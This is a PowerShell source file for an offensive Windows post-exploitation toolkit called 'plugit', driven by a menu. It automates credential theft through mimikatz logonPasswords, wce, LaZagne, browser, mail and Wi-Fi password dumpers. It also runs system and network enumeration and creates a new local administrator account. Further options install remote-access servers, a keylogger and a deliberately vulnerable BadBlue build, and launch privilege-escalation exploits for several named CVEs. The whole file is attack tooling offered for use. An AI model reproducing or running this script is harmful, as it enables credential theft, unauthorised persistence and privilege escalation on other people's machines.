#title:plugit.ps1
#author:hacknonym

param([Int32]$nb)

$CURRENT_PATH = [System.Environment]::CurrentDirectory

Function Banner(){
    Write-Host -ForegroundColor Yellow "     ____  __            _ __" 
    Write-Host -ForegroundColor Yellow "    / __ \/ /_  ______ _(_) /_"
    Write-Host -ForegroundColor Yellow "   / /_/ / / / / / __ \`/ / __/"
    Write-Host -ForegroundColor Yellow "  / ____/ / /_/ / /_/ / / /_  "
    Write-Host -ForegroundColor Yellow " /_/   /_/\__,_/\__, /_/\__/ " 
    Write-Host -ForegroundColor Yellow -NoNewLine "               /____/"
    Write-Host -ForegroundColor White "        Author: hacknonym`n"
    Write-Host -ForegroundColor Red " (AP) Need Admin Privileges`n"
}

Function BackMenu(){
    Write-Host -ForegroundColor White "Push ENTER to back menu"
    $Enter = Read-Host
    Set-Location -Path "$CURRENT_PATH"
    .\plugit.ps1 -nb 1
}

Function EnumSys(){
    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "> Enumerating system`n"

    $TOTAL = 12

    Write-Host -ForegroundColor Green -NoNewLine "[+] "
    Write-Host "Remove old output files..."
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\wifipass\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\wce\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\mimikatz\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\LaZagne\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\SharpWeb\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\winPEAS\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\WindowsEnum\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\SeatBelt\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\SharpShares\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\Watson\*
    Remove-Item -path $CURRENT_PATH\output\enumerate_system\tree\*

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch wifipass.ps1...`t[1/$TOTAL]"
    Set-Location -Path "$CURRENT_PATH\wifipass"
    .\wifipass.ps1 > $CURRENT_PATH\output\enumerate_system\wifipass\credentials.txt

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch wce.exe...`t`t[2/$TOTAL]"
    Set-Location -Path "$CURRENT_PATH\wce"
    .\wce.exe -w > $CURRENT_PATH\output\enumerate_system\wce\credentials.txt

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host -ForegroundColor Red -NoNewLine "(AP) "
    Write-Host "Launch mimikatz.exe...`t[3/$TOTAL]"
    Write-Host -NoNewLine "> "
    Write-Host -ForegroundColor Yellow "log ../output/enumerate_system/mimikatz/credentials.log"
    Write-Host -NoNewLine "> "
    Write-Host -ForegroundColor Yellow "privilege::debug"
    Write-Host -NoNewLine "> "
    Write-Host -ForegroundColor Yellow "sekurlsa::logonPasswords full"
    Write-Host -NoNewLine "> "
    Write-Host -ForegroundColor Yellow "exit`n"
    Start-Process powershell -Verb runAs "Set-Location -Path $CURRENT_PATH\mimikatz; start mimikatz.exe"

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch Password Recovery Utilities...`t[4/$TOTAL]"
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "BulletsPassView.exe`t1/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\BulletsPassView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\BulletsPassView.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "ChromePass.exe`t2/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\ChromePass.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\ChromePass.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "iepv.exe`t`t3/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\iepv.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\iepv.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "mailpv.exe`t`t4/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\mailpv.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\mailpv.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "mspass.exe`t`t5/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\mspass.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\mspass.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host -ForegroundColor Red -NoNewLine "(AP) "; Write-Host "netpass.exe`t6/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\netpass.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\netpass.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "OperaPassView.exe`t7/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\OperaPassView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\OperaPassView.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "PasswordFox.exe`t8/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\PasswordFox.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\PasswordFox.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "ProduKey.exe`t9/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\ProduKey.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\ProduKey.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "pspv.exe`t`t10/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\pspv.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\pspv.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "PstPassword.exe`t11/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\PstPassword.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\PstPassword.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "rdpv.exe`t`t12/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\rdpv.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\rdpv.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "RouterPassView.exe`t13/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\RouterPassView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\RouterPassView.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "VNCPassView.exe`t14/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\VNCPassView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\VNCPassView.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "WebBrowserPassView.exe`t15/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\WebBrowserPassView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\WebBrowserPassView.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host -ForegroundColor Red -NoNewLine "(AP) "; Write-Host "WirelessKeyView.exe`t16/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\WirelessKeyView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\WirelessKeyView.txt
    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "WNetWatcher.exe`t17/17"
    cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\WNetWatcher.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\WNetWatcher.extxte

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch lazagne.exe...`t[5/$TOTAL]"
    Set-Location -Path "$CURRENT_PATH\LaZagne"
    .\lazagne.exe all > $CURRENT_PATH\output\enumerate_system\LaZagne\credentials.txt

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch SharpWeb.exe...`t[6/$TOTAL]"
    Set-Location -Path "$CURRENT_PATH\SharpWeb"
    .\SharpWeb.exe all > $CURRENT_PATH\output\enumerate_system\SharpWeb\credentials.txt

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch winPEAS.ps1...`t[7/$TOTAL]"
    Set-Location -Path "$CURRENT_PATH\winPEAS"
    .\winPEAS.bat > $CURRENT_PATH\output\enumerate_system\winPEAS\enumeration.txt

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch WindowsEnum.ps1...`t[8/$TOTAL]"
    Set-Location -Path "$CURRENT_PATH\WindowsEnum"
    .\WindowsEnum.ps1 > $CURRENT_PATH\output\enumerate_system\WindowsEnum\enumeration.txt

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch SeatBelt.exe...`t[9/$TOTAL]"
    Set-Location -Path "$CURRENT_PATH\SeatBelt"
    .\Seatbelt.exe -group=all > $CURRENT_PATH\output\enumerate_system\SeatBelt\enumeration.txt

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch SharpShares.exe...`t[10/$TOTAL]"
    Set-Location -Path "$CURRENT_PATH\SharpShares"
    .\SharpShares.exe shares > $CURRENT_PATH\output\enumerate_system\SharpShares\enumeration.txt

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch Watson.exe...`t[11/$TOTAL]"
    Set-Location -Path "$CURRENT_PATH\Watson"
    .\Watson.exe > $CURRENT_PATH\output\enumerate_system\Watson\security-breach.txt

    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "Launch browse the tree...`t[12/$TOTAL]"
    tree /F $env:UserProfile > $CURRENT_PATH\output\enumerate_system\tree\browse-tree.txt
}

Function ScanNetwork(){
    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "> Scan the network`n"

    Write-Host -ForegroundColor Green -NoNewLine "[+] "
    Write-Host "Remove old output files..."
    Remove-Item -path $CURRENT_PATH\output\network_scan\*

    $machineName = $env:ComputerName
    $hostEntry = [System.Net.Dns]::GetHostByName($machineName)

    Write-Host -ForegroundColor Yellow -NoNewLine "[i] "
    Write-Host -NoNewLine "Local IP: "
    Write-Host -ForegroundColor Yellow $hostEntry.AddressList[0].IPAddressToString

    Write-Host -ForegroundColor Blue -NoNewLine "[?] "
    Write-Host -NoNewLine "Network IP (e.g. 192.168.0.0)> "
    $NetworkIP = Read-Host
    Write-Host -ForegroundColor Blue -NoNewLine "[?] "
    Write-Host -NoNewLine "CIDR (e.g. 24)> "
    $CIDR = Read-Host

    Write-Host -ForegroundColor Green -NoNewLine "[+] "
    Write-Host "Scan $NetworkIP/$CIDR in progress..."
    Set-Location -Path "$CURRENT_PATH\IPv4NetworkScanner"
    .\IPv4NetworkScan.ps1 -IPv4Address $NetworkIP -CIDR $CIDR -EnableMACResolving > $CURRENT_PATH\output\network_scan\scan.txt
}

Function SearchFiles(){
    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "> Search important files`n"

    Write-Host -ForegroundColor Green -NoNewLine "[+] "
    Write-Host "Remove old output files..."
    Remove-Item -path $CURRENT_PATH\output\search_files\*
    Set-Location -Path "$CURRENT_PATH\searchfile\"
    .\searchfile.ps1
}

Function CreateAdminUser(){
    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "> Create an admin user`n"

    Write-Host -ForegroundColor Blue -NoNewLine "[?] "
    Write-Host -NoNewLine "Username > "
    $CA_UserName = Read-Host
    Write-Host -ForegroundColor Blue -NoNewLine "[?] "
    Write-Host -NoNewLine "Password > "
    $CA_Password = Read-Host

    Start-Process powershell -Verb runAs "net user $CA_UserName $CA_Password /add; net localgroup administrateurs $CA_UserName /add"
}

Function ChangePwd(){
    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "> Change password of current user`n"

    Write-Host -ForegroundColor Green -NoNewLine "[+] "
    Write-Host -NoNewLine "Change password of "
    Write-Host -ForegroundColor White $env:UserName 

    Start-Process powershell -Verb runAs "net user $env:UserName *"
}

Function InstallProg(){
    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "> Install programs`n"

    Write-Host -ForegroundColor White -NoNewLine " 0"; Write-Host ") :: Back menu"
    Write-Host -ForegroundColor White -NoNewLine " 1"; Write-Host -NoNewLine ") :: Install FTP Server "; Write-Host -ForegroundColor Cyan "(Filezilla)"
    Write-Host -ForegroundColor White -NoNewLine " 2"; Write-Host -NoNewLine ") :: Install SSH Server "; Write-Host -ForegroundColor Cyan "(Bitvise)"
    Write-Host -ForegroundColor White -NoNewLine " 3"; Write-Host -NoNewLine ") :: Install VNC Server "; Write-Host -ForegroundColor Cyan "(TightVNC)"
    Write-Host -ForegroundColor White -NoNewLine " 4"; Write-Host -NoNewLine ") :: Install Telnet Server "; Write-Host -ForegroundColor Cyan "(Pragma Systems)"
    Write-Host -ForegroundColor White -NoNewLine " 5"; Write-Host -NoNewLine ") :: Install Shadow Keylogger "; Write-Host -ForegroundColor Cyan "(sk)"
    Write-Host -ForegroundColor White -NoNewLine " 6"; Write-Host ") :: Install corrupt BadBlue version`n"

    Write-Host -NoNewLine "> "
    $Option = Read-Host

    $Result = switch ($Option) {
        0 {BackMenu; break}
        1 {
            Set-Location -Path "$CURRENT_PATH\programs\"
            start filezilla-server.exe
            InstallProg; break
        }
        2 {
            Set-Location -Path "$CURRENT_PATH\programs\"
            start ssh-server.exe
            InstallProg; break
        }
        3 {
            Set-Location -Path "$CURRENT_PATH\programs\"
            start tightvnc-server.msi
            InstallProg; break
        }
        4 {
            Set-Location -Path "$CURRENT_PATH\programs\"
            start telnet-server.exe
            InstallProg; break
        }
        5 {
            Set-Location -Path "$CURRENT_PATH\programs\"
            start sk.exe
            Write-Host -ForegroundColor Yellow -NoNewLine "`n[i] "; Write-Host "To start keylogging, type a password into both password fields and click 'Record!'."
            Write-Host -ForegroundColor Yellow -NoNewLine "[i] "; Write-Host "After you have finished recording, simply type your password anywhere on the computer to end the session."
            Write-Host -ForegroundColor Yellow -NoNewLine "[i] "; Write-Host "The results window will then appear, where you can review and save the recorded data.`n"

            Write-Host -ForegroundColor White "Push ENTER to continue"
            $Enter = Read-Host
            InstallProg; break
        }
        6 {
            Set-Location -Path "$CURRENT_PATH\programs\"
            start badblue-2.72.exe
            InstallProg; break
        }
        default {InstallProg; break}
    }
}

Function PrivsEsc(){
    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "> Privileges escalation`n"

    Write-Host -ForegroundColor White -NoNewLine " 0"; Write-Host ") :: Back menu"
    Write-Host -ForegroundColor White -NoNewLine " 1"; Write-Host ") :: CVE-2012-0217"
    Write-Host -ForegroundColor White -NoNewLine " 2"; Write-Host ") :: CVE-2016-3309"
    Write-Host -ForegroundColor White -NoNewLine " 3"; Write-Host ") :: CVE-2016-3371"
    Write-Host -ForegroundColor White -NoNewLine " 4"; Write-Host ") :: CVE-2016-7255"
    Write-Host -ForegroundColor White -NoNewLine " 5"; Write-Host ") :: CVE-2017-0213`n"

    Write-Host -NoNewLine "> "
    $Option = Read-Host

    $Result = switch ($Option) {
        0 {BackMenu; break}
        1 {
            Set-Location -Path "$CURRENT_PATH\privs-esc\"
            start CVE-2012-0217.exe
            PrivsEsc; break
        }
        2 {
            Set-Location -Path "$CURRENT_PATH\privs-esc\"
            start CVE-2016-3309.exe
            PrivsEsc; break
        }
        3 {
            Set-Location -Path "$CURRENT_PATH\privs-esc\"
            start CVE-2016-3371.exe
            PrivsEsc; break
        }
        4 {
            Set-Location -Path "$CURRENT_PATH\privs-esc\"
            .\CVE-2016-7255.ps1
            PrivsEsc; break
        }
        5 {
            Set-Location -Path "$CURRENT_PATH\privs-esc\"
            start CVE-2017-0213.exe
            PrivsEsc; break
        }
        default {PrivsEsc; break}
    }
}

Function DestroySys(){
    Write-Host -ForegroundColor Blue -NoNewLine "[*] "
    Write-Host "> Destroy system`n"
}


#Start the program
if($nb -ne 0 -and $nb -le 10){
    $nb = $nb - 1
    $i = 0
    while($i -lt $nb){
        Start-Process cmd "cmd /c powershell -Exec Bypass -File .\plugit.ps1 -nb 1"
        $i++
    }
} else{
    powershell .\plugit.ps1 -nb 1
}

Mode con cols=84 lines=23

New-Item -Path "$CURRENT_PATH\output\network_scan" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\search_files" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\wifipass" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\wce" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\mimikatz" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\LaZagne" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\SharpWeb" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\winPEAS" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\WindowsEnum" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\SeatBelt" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\SharpShares" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\Watson" -ItemType Directory | Out-Null
New-Item -Path "$CURRENT_PATH\output\enumerate_system\tree" -ItemType Directory | Out-Null

Clear-Host
Banner

Write-Host -ForegroundColor White -NoNewLine " 1"; Write-Host -NoNewLine ") :: Enumerating system`t(-> "; Write-Host -ForegroundColor Yellow -NoNewLine "output/enumerate_system/ "; Write-Host ")"
Write-Host -ForegroundColor White -NoNewLine " 2"; Write-Host -NoNewLine ") :: Search important files`t(-> "; Write-Host -ForegroundColor Yellow -NoNewLine "output/search_files/ "; Write-Host ")"
Write-Host -ForegroundColor White -NoNewLine " 3"; Write-Host -NoNewLine ") :: Scan the network`t`t(-> "; Write-Host -ForegroundColor Yellow -NoNewLine "output/network_scan/ "; Write-Host ")"
Write-Host -ForegroundColor White -NoNewLine " 4"; Write-Host -NoNewLine ") :: "; Write-Host -ForegroundColor Red -NoNewLine "(AP) "; Write-Host "Create an admin user"
Write-Host -ForegroundColor White -NoNewLine " 5"; Write-Host -NoNewLine ") :: "; Write-Host -ForegroundColor Red -NoNewLine "(AP) "; Write-Host "Change password of current user"
Write-Host -ForegroundColor White -NoNewLine " 6"; Write-Host -NoNewLine ") :: "; Write-Host -ForegroundColor Red -NoNewLine "(AP) "; Write-Host "Install programs"
Write-Host -ForegroundColor White -NoNewLine " 7"; Write-Host ") :: Privileges escalation"
Write-Host -ForegroundColor White -NoNewLine " 8"; Write-Host ") :: Destroy system`n"

Write-Host -NoNewLine "/plugit> "
$Option = Read-Host

$Result = switch ($Option) {
    1 {EnumSys; BackMenu; break}
    2 {SearchFiles; BackMenu; break}
    3 {ScanNetwork; BackMenu; break}
    4 {CreateAdminUser; BackMenu; break}
    5 {ChangePwd; BackMenu; break}
    6 {InstallProg; BackMenu; break}
    7 {PrivsEsc; BackMenu; break}
    8 {DestroySys; BackMenu; break}
    default {BackMenu; break}
}
